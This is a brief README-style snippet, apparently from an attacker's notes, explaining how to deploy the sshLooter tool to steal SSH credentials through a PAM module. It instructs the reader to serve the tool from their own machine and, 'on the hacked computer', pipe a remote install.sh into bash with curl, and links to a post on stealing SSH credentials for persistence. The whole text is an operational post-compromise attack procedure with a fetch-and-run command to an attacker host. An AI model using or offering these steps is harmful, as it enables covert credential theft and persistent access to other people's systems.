# Using PAM module
```bash
git clone https://github.com/mthbernardes/sshLooter.git
cd sshLooter

# On your server execute.
python -m SimpleHTTPServer

# On the hacked computer execute.
curl http://yourserverip:8000/install.sh | bash
```

# References
[Stealing SSH credentials Another Approach](https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html)

[sshLooter](https://github.com/mthbernardes/sshLooter)